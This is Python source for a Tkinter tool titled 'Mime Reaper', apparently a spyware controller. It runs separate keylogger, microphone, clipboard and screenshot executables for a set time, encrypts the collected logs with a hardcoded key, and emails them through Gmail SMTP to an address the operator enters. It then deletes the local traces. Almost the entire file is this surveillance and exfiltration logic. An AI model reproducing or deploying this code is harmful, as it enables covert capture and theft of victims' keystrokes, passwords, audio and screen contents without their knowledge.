# import .venv
import subprocess
from tkinter import *
import sys,os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import time,math
import threading
from cryptography.fernet import Fernet
from pynput.keyboard import Key,Listener
from tkinter import font
from tkinter import Tk, Label
from PIL import Image, ImageTk



def send_email_async(from_email,passw,to_email,audio_info):
    send_email(from_email,passw,to_email,audio_info, audio_info)
    print("Email sent:", audio_info)
keys_information="key_log.txt"
clipboard_information = "clipboard.txt"
system_information = "systeminfo.txt"
screenshot_information = "screenshots.zip"
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

key ="u-LgEHI1huerXoobNEz4XX9xbmSR7ZnW5GO_EIupFAY="
def resource_path(relative_path):
    try:
        base_path=sys.abspath(".")
    except Exception:
        base_path=os.path.abspath(".")
    return os.path.join(base_path,relative_path)

def run_other_exe(from_email,passw,to_email,times):
    exe_path1 = r'microphone.exe'
    exe_path2 = r'keylog.exe'
    exe_path3 = r'cc.exe'
    exe_path4 = r'screenshot.exe'
    command1 = f'{exe_path1} {times}'
    command2 = f'{exe_path2} {times}'
    command3 = f'{exe_path3} {times}'
    command4 = f'{exe_path4} {times}'
    subprocess.Popen(command1, shell=True)
    subprocess.Popen(command2, shell=True)
    subprocess.Popen(command3, shell=True)
    subprocess.Popen(command4, shell=True)
    time.sleep(60*int(times))

    print("Completed RunOtherExe")
    files_to_encrypt = [system_information, clipboard_information, keys_information]
    encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]
    count = 0

    for encrypting_file in files_to_encrypt:
            with open(files_to_encrypt[count], 'rb') as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(encrypted_file_names[count], 'wb') as f:
                f.write(encrypted)
            count += 1
    
def on_button_click():
    
    from_email = v1.get()
    passw = v2.get() 
    print(passw)   
    to_email = v3.get()
    print(to_email)   
    times = v4.get()
    print(type(times))
    print(times)   
    window.destroy()
    run_other_exe(from_email,passw,to_email,times)
    time.sleep(10)
    print("mail 1:")
    send_email(from_email,passw,to_email,keys_information_e,keys_information_e)
    time.sleep(5)
    print("mail 2:")
    send_email(from_email,passw,to_email,clipboard_information_e,clipboard_information_e)
    time.sleep(5)
    print("mail 3:")
    send_email(from_email,passw,to_email,system_information_e,system_information_e)
    time.sleep(5)
    print("mail 4:")
    count=math.ceil(int(times)/2)
    t=False
    
    for i in range(count):
        audio_information = f"audio{i + 1}.zip"
        
        email_thread = threading.Thread(target=send_email_async, args=(from_email,passw,to_email,audio_information,))
        email_thread.start()
        t=True
    print("mail 5:")
    send_email(from_email,passw,to_email,screenshot_information,screenshot_information)
    if(t):
        delete_files = [system_information, clipboard_information,screenshot_information,
                        system_information_e,clipboard_information_e,keys_information_e]
        for file in delete_files:
            os.remove(file)
        time.sleep(60)
        delete_files1=[]
        for i in range(count):
            audio_information = f"audio{i + 1}.zip"
            delete_files1.append(audio_information)
            time.sleep(60)

        for file in delete_files1:
            os.remove(file)
        time.sleep(60)
        os.remove("key_log.txt")
    sys.exit()

window=Tk()
pil_image = Image.open('ichan.png')
pil_image = pil_image.resize((50, 50), Image.LANCZOS)
image = ImageTk.PhotoImage(pil_image)
img_label = Label(window,image=image,anchor='w')

window.title('** Mime Reaper **')
window.iconbitmap('icon.ico')
window.configure(bg='#ff4747')

cursive_font = font.Font(family="Calibri", size=11, slant="italic")
font1 = font.Font(family="Calibri", size=13, weight="bold")
e1=Label(window,text="Email [From]      :", fg='black', bg='#ff4747', anchor='w', font=cursive_font)
v1=Entry(window,textvariable=StringVar())
e2=Label(window,text="Password           :", fg='black', bg='#ff4747', anchor='w', font=cursive_font)
v2=Entry(window,textvariable=StringVar(),show="*")
e3=Label(window,text="Email [To]           :", fg='black', bg='#ff4747', anchor='w', font=cursive_font)
v3=Entry(window,textvariable=StringVar())
e4=Label(window,text="No of sec            :", fg='black', bg='#ff4747', anchor='w', font=cursive_font)
v4=Entry(window,textvariable=IntVar())
e5=Label(window,text="Copyright © Jyoti Kumari,2024. All rights reserved.", fg='black', bg='red', anchor='w')

b1=Button(window,text="RUN",command=on_button_click,fg='yellow', bg='red',font=font1)

def send_email(from_email,passw,to_email,filename, attachment):
    email_address=from_email
    password=passw
    toaddr=to_email

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(resource_path(attachment), 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

e1.grid(row=0,column=0,sticky='w')
v1.grid(row=0,column=1)
e2.grid(row=1,column=0,sticky='w')
v2.grid(row=1,column=1)
e3.grid(row=2,column=0,sticky='w')
v3.grid(row=2,column=1)
e4.grid(row=3,column=0,sticky='w')
v4.grid(row=3,column=1)
b1.grid(row=4,column=1,columnspan=2,pady=10)
img_label.grid(row=4, column=0)
e5.grid(row=8,column=0)
window.mainloop()